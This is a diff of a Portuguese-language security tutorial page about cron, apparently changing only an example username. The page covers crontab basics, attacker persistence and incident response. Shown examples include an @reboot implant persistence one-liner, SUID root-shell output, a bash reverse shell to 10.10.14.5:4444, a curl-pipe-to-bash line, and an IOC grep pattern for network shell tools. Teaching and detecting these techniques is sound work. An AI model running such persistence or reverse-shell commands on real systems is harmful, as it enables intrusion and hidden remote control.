@@ -88,7 +88,7 @@ total 36
 0 3 * * *    /opt/backup/backup.sh            # diário às 03:00
 0 9 * * 1-5  /usr/local/bin/relatorio.sh      # 09:00 seg-sex
 30 4 1 * *   /usr/local/bin/mensal.sh         # dia 1 do mês às 04:30
-@reboot      /home/wallyson/c2/implant.sh     # toda vez que o host bootar`}
+@reboot      /home/ana/c2/implant.sh     # toda vez que o host bootar`}
       />
 
       <h2>Edição e visualização</h2>
@@ -98,7 +98,7 @@ total 36
           { cmd: "crontab -e", desc: "Edita o crontab do usuário atual.", output: "Abre $EDITOR (vim/nano). Valida sintaxe ao salvar." },
           { cmd: "crontab -l", desc: "Lista o crontab atual.", output: "*/5 * * * * /usr/local/bin/coleta.sh" },
           { cmd: "crontab -r", desc: "REMOVE TODO o crontab (sem confirmar — cuidado).", output: "Quer confirmar: -i." },
-          { cmd: "crontab -u wallyson -l", desc: "Lista o crontab de outro usuário (precisa root).", output: "Em IR é a primeira coisa a checar." },
+          { cmd: "crontab -u ana -l", desc: "Lista o crontab de outro usuário (precisa root).", output: "Em IR é a primeira coisa a checar." },
           { cmd: "crontab arquivo.txt", desc: "Substitui o crontab pelo conteúdo do arquivo.", output: "Útil em scripts de provisionamento." },
           { cmd: "crontab -e -u root", desc: "Edita o crontab do root (precisa sudo).", output: "Persistence persistente." },
         ]}
@@ -110,9 +110,9 @@ total 36
           {
             cmd: "crontab -l",
             out: `# m h  dom mon dow   command
-*/10 * * * *  /home/wallyson/scripts/check-vpn.sh
-0 */6 * * *   rsync -a --delete /home/wallyson/notes/ /backup/notes/
-@reboot       /home/wallyson/.config/autostart/healthcheck.sh`,
+*/10 * * * *  /home/ana/scripts/check-vpn.sh
+0 */6 * * *   rsync -a --delete /home/ana/notes/ /backup/notes/
+@reboot       /home/ana/.config/autostart/healthcheck.sh`,
             outType: "info",
           },
         ]}
@@ -144,7 +144,7 @@ MAILTO=root
           { cmd: "SHELL=/bin/bash", desc: "Shell que vai executar o comando (default /bin/sh).", output: "Use bash se seu script tem 'bashisms'." },
           { cmd: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", desc: "PATH MÍNIMO. Cron NÃO herda do seu shell.", output: "Bug #1 do mundo: 'no shell, funciona; no cron, não'." },
           { cmd: "MAILTO=user@host", desc: "Recebe stdout/stderr do job por email.", output: "Vazio (MAILTO=\"\") = não envia." },
-          { cmd: "HOME=/home/wallyson", desc: "HOME pra resolver ~ no script.", output: "Default já é o home do usuário do crontab." },
+          { cmd: "HOME=/home/ana", desc: "HOME pra resolver ~ no script.", output: "Default já é o home do usuário do crontab." },
           { cmd: "CRON_TZ=America/Sao_Paulo", desc: "Timezone para AS HORAS do crontab.", output: "Sem isso usa /etc/localtime." },
         ]}
       />
@@ -155,17 +155,17 @@ MAILTO=root
         lines={[
           {
             cmd: "sudo journalctl -u cron --since '10 min ago'",
-            out: `Apr 03 14:30:01 kali CRON[15201]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)
+            out: `Apr 03 14:30:01 kali CRON[15201]: (ana) CMD (/home/ana/scripts/check-vpn.sh)
 Apr 03 14:30:01 kali CRON[15200]: (CRON) info (No MTA installed, discarding output)
 Apr 03 14:35:01 kali CRON[15348]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
-Apr 03 14:40:01 kali CRON[15401]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)`,
+Apr 03 14:40:01 kali CRON[15401]: (ana) CMD (/home/ana/scripts/check-vpn.sh)`,
             outType: "info",
           },
           {
             comment: "filtra só por usuário",
-            cmd: "sudo journalctl -u cron --since today | grep '(wallyson)'",
-            out: `Apr 03 14:30:01 kali CRON[15201]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)
-Apr 03 14:40:01 kali CRON[15401]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)`,
+            cmd: "sudo journalctl -u cron --since today | grep '(ana)'",
+            out: `Apr 03 14:30:01 kali CRON[15201]: (ana) CMD (/home/ana/scripts/check-vpn.sh)
+Apr 03 14:40:01 kali CRON[15401]: (ana) CMD (/home/ana/scripts/check-vpn.sh)`,
             outType: "default",
           },
           {
@@ -230,7 +230,7 @@ Apr 03 14:40:01 kali CRON[15401]: (wallyson) CMD (/home/wallyson/scripts/check-v
         path="~"
         lines={[
           {
-            cmd: "(crontab -l 2>/dev/null; echo '@reboot /home/wallyson/.cache/.helper.sh') | crontab -",
+            cmd: "(crontab -l 2>/dev/null; echo '@reboot /home/ana/.cache/.helper.sh') | crontab -",
             out: "(implant nasce SOZINHO no próximo boot)",
             outType: "warning",
           },
@@ -286,7 +286,7 @@ find /var/log -name '*.gz' -mtime +30 -delete`,
             cmd: "ls -la /tmp/rootbash && /tmp/rootbash -p",
             out: `-rwsr-sr-x 1 root root 1396520 Apr  3 03:00 /tmp/rootbash
 bash-5.2# id
-uid=1000(wallyson) gid=1000(wallyson) euid=0(root) groups=1000(wallyson)`,
+uid=1000(ana) gid=1000(ana) euid=0(root) groups=1000(ana)`,
             outType: "error",
           },
         ]}
@@ -302,7 +302,7 @@ uid=1000(wallyson) gid=1000(wallyson) euid=0(root) groups=1000(wallyson)`,
             out: `2026/04/03 14:50:01 CMD: UID=0    PID=15822  | /bin/sh -c /opt/scripts/internal/healthcheck.sh
 2026/04/03 14:50:01 CMD: UID=0    PID=15823  | /opt/scripts/internal/healthcheck.sh
 2026/04/03 14:55:01 CMD: UID=0    PID=15901  | /usr/sbin/CRON -f
-2026/04/03 14:55:01 CMD: UID=1000 PID=15904  | /home/wallyson/scripts/check-vpn.sh`,
+2026/04/03 14:55:01 CMD: UID=1000 PID=15904  | /home/ana/scripts/check-vpn.sh`,
             outType: "warning",
           },
         ]}
@@ -318,7 +318,7 @@ uid=1000(wallyson) gid=1000(wallyson) euid=0(root) groups=1000(wallyson)`,
       <CommandTable
         title="O que rodar quando suspeita de cron malicioso"
         variations={[
-          { cmd: "for u in $(cut -d: -f1 /etc/passwd); do echo \"# $u\"; sudo crontab -u $u -l 2>/dev/null; done", desc: "Lista crontab de TODOS os usuários.", output: "# root\\n# wallyson\\n*/10 * * * * /bin/bash -c '...'" },
+          { cmd: "for u in $(cut -d: -f1 /etc/passwd); do echo \"# $u\"; sudo crontab -u $u -l 2>/dev/null; done", desc: "Lista crontab de TODOS os usuários.", output: "# root\\n# ana\\n*/10 * * * * /bin/bash -c '...'" },
           { cmd: "ls -la /var/spool/cron/crontabs/", desc: "Backend file dos crontabs de usuário.", output: "Compara mtime com data do incidente." },
           { cmd: "cat /etc/crontab /etc/cron.d/*", desc: "Crontabs de sistema, com USER explícito.", output: "Procurar entradas com curl|wget|bash|nc." },
           { cmd: "ls -la /etc/cron.{hourly,daily,weekly,monthly}/", desc: "Scripts disparados pelo run-parts.", output: "Veja permissões — algum 777?" },
@@ -346,10 +346,10 @@ done
 # 2) IOC scan
 sudo grep -rE 'curl|wget|/dev/tcp|bash -i|nc ' /etc/cron* /var/spool/cron/ 2>/dev/null
 
-# 3) limpeza (ex: usuario wallyson comprometido)
-sudo crontab -u wallyson -r
+# 3) limpeza (ex: usuario ana comprometido)
+sudo crontab -u ana -r
 sudo rm -f /etc/cron.d/system-update`}
-        expected={`==[ wallyson ]==
+        expected={`==[ ana ]==
 */10 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
 /etc/cron.d/system-update:*/30 * * * * root curl -s http://10.10.14.5/u | bash`}
         verify="Após a limpeza, rode novamente os comandos 1 e 2 — não deve mais aparecer nada suspeito. Reinicie o cron.service e monitore journalctl -u cron por 30 min."
